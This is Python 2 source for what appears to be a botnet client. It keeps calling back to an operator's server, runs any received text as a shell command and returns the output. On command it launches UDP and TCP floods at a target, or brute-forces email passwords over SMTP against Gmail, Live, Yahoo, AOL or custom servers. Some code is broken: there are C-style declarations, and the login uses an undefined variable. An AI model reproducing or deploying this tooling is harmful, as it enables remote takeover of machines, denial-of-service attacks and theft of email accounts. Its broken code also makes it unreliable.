#!/usr/bin/env python2

import subprocess, os, sys, time, threading, signal, smtplib
from socket import *
from itertools import product
from threading import Thread

if (len(sys.argv) == 3):
	host = sys.argv[1]
	port = int(sys.argv[2])
else:
	sys.exit("Usage: client.py <server ip> <server port>")

class Alarm(Exception):
    pass

def alarm_handler(signum, frame):
    raise Alarm

def savePass(password):
	f = open("password.txt", "w")
	f.write(password)
	f.close()

def gmailbruteforce(email, combination, minimum, maximum):
	smtpserver = smtplib.SMTP("smtp.gmail.com",587)
	smtpserver.starttls()
	smtpserver.ehlo()

	bool found = False;

	for n in range(minimum, maximum+1):
		if (found == False):
        		for w in product(combination,repeat=n):
            			word = ''.join(w)
            			try:
					smtpserver.login(email, password)
				except(smtplib.SMTPAuthenticationError), msg:
					if "Please Log" in str(msg):
						savePass(password)
						found = True
						break
		else:
			break

def custombruteforce(address, port, email, combination, minimum, maximum):
	smtpserver = smtplib.SMTP(address,int(port))
	smtpserver.starttls()
	smtpserver.ehlo()

	bool found = False;

	for n in range(minimum, maximum+1):
		if (found == False):
        		for w in product(combination,repeat=n):
            			word = ''.join(w)
            			try:
					smtpserver.login(email, password)
					savePass(password)
					found = True
					break
				except:
					pass
		else:
			break

class udpFlood(threading.Thread):
    def __init__ (self, victimip, victimport):
        threading.Thread.__init__(self)
        self.victimip = victimip
	self.victimport = victimport

    def run(self):
	timeout = time.time() + 60
        while True:
 		test = 0
    		if (time.time() <= timeout):
			s = socket(AF_INET, SOCK_DGRAM)
			s.connect((self.victimip, int(self.victimport)))
			s.send('A' * 65000)        
		else:
			break

class tcpFlood(threading.Thread):
    def __init__ (self, victimip, victimport):
        threading.Thread.__init__(self)
        self.victimip = victimip
	self.victimport = victimport

    def run(self):
	timeout = time.time() + 60
        while True:
 		test = 0
    		if (time.time() <= timeout):
			s = socket(AF_INET, SOCK_STREAM)
			s.settimeout(1)
			s.connect((self.victimip, int(self.victimport)))
			s.send('A' * 65000)       
		else:
			break

def udpUnleach(victimip, victimport):
	threads = []
	for i in range(1, 11):
    		thread = udpFlood(victimip, victimport)
    		thread.start()
   		threads.append(thread)
 
	for thread in threads:
    		thread.join()

def tcpUnleach(victimip, victimport):
	threads = []
	for i in range(1, 11):
    		thread = tcpFlood(victimip, victimport)
    		thread.start()
   		threads.append(thread)
 
	for thread in threads:
    		thread.join()

def main():
	while 1:
		s=socket(AF_INET, SOCK_STREAM)
		while 1:
			try:
				s.connect((host,port))
				print "[INFO] Connected"
				break;
			except:
				time.sleep(5)
		
		while 1:
			try:
				msg=s.recv(10240)
				if ((msg != "exit") and ("cd " not in msg) and ("udpflood " not in msg) and ("tcpflood " not in msg) and (msg != "hellows123") and ("udpfloodall " not in msg) and ("tcpfloodall " not in msg) and ("gmailbruteforce" not in msg) and ("livebruteforce" not in msg) and ("yahoobruteforce" not in msg) and ("aolbruteforce" not in msg) and ("custombruteforce" not in msg)):
					comm = subprocess.Popen(str(msg), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
					signal.signal(signal.SIGALRM, alarm_handler)
					signal.alarm(30)
					try:
    						STDOUT, STDERR = comm.communicate()
						en_STDERR = bytearray(STDERR)
						en_STDOUT = bytearray(STDOUT)
						if (en_STDERR == ""):
							if (en_STDOUT != ""):
								print en_STDOUT
								s.send(en_STDOUT)
							else:
								s.send("[CLIENT] Command Executed")
						else:
							print en_STDERR
							s.send(en_STDERR)
					except Alarm:
						comm.terminate()
						comm.kill()
    						s.send("[CLIENT] 30 Seconds Exceeded - SubProcess Killed\n")				
					signal.alarm(0)
				elif ("cd " in msg):
					msg = msg.replace("cd ","")
					os.chdir(msg)
					s.send(os.getcwd())
					print "[INFO] Changed dir to %s" % os.getcwd()
				elif ("udpflood " in msg):
					msg = msg.replace("udpflood ", "")
					seperator = msg.index(":")
					try:
						udpUnleach(msg[:seperator],msg[seperator+1:])
					except:
						pass
				elif ("udpfloodall " in msg):
					msg = msg.replace("udpfloodall ", "")
					seperator = msg.index(":")
					try:
						udpUnleach(msg[:seperator],msg[seperator+1:])
					except:
						pass
				elif ("tcpflood " in msg):
					msg = msg.replace("tcpflood ", "")
					seperator = msg.index(":")
					try:
						tcpUnleach(msg[:seperator],msg[seperator+1:])
					except:
						pass
				elif ("tcpfloodall " in msg):
					msg = msg.replace("tcpfloodall ", "")
					seperator = msg.index(":")
					try:
						tcpUnleach(msg[:seperator],msg[seperator+1:])
					except:
						pass
				elif ("gmailbruteforce " in msg):
					msg = msg.replace("gmailbruteforce ", "")
					try:
						email, combination, minimum, maximum = msg.split(":")
						t = Thread(None,gmailbruteforce,None,(email, combination, minimum, maximum))
        					t.start()
						s.send("[INFO] Bruteforcing started\n")				
					except:
						s.send("[ERROR] Wrong arguments\n")
				elif ("livebruteforce " in msg):
					msg = msg.replace("livebruteforce ", "")
					try:
						email, combination, minimum, maximum = msg.split(":")
						t = Thread(None,custombruteforce,None,("smtp.live.com", 587, email, combination, minimum, maximum))
        					t.start()
						s.send("[INFO] Bruteforcing started\n")				
					except:
						s.send("[ERROR] Wrong arguments\n")
				elif ("yahoobruteforce " in msg):
					msg = msg.replace("yahoobruteforce ", "")
					try:
						email, combination, minimum, maximum = msg.split(":")
						t = Thread(None,custombruteforce,None,("smtp.mail.yahoo.com", 587, email, combination, minimum, maximum))
        					t.start()
						s.send("[INFO] Bruteforcing started\n")				
					except:
						s.send("[ERROR] Wrong arguments\n")
				elif ("aolbruteforce " in msg):
					msg = msg.replace("aolbruteforce ", "")
					try:
						email, combination, minimum, maximum = msg.split(":")
						t = Thread(None,custombruteforce,None,("smtp.aol.com", 587, email, combination, minimum, maximum))
        					t.start()
						s.send("[INFO] Bruteforcing started\n")				
					except:
						s.send("[ERROR] Wrong arguments\n")
				elif ("custombruteforce " in msg):
					msg = msg.replace("custombruteforce ", "")
					try:
						address, port, email, combination, minimum, maximum = msg.split(":")
						t = Thread(None,custombruteforce,None,(address, port, email, combination, minimum, maximum))
        					t.start()
						s.send("[INFO] Bruteforcing started\n")				
					except:
						s.send("[ERROR] Wrong arguments\n")
				elif (msg == "hellows123"):
					s.send(os.getcwd())
				else:
					print "[INFO] Connection Closed"
					s.close()
					break
			except KeyboardInterrupt:
				print "[INFO] Connection Closed"
				s.close()
				break
			except:
				print "[INFO] Connection Closed"
				s.close()
				break
			
while 1:
	try:
		main()
	except:
		pass

	time.sleep(5)
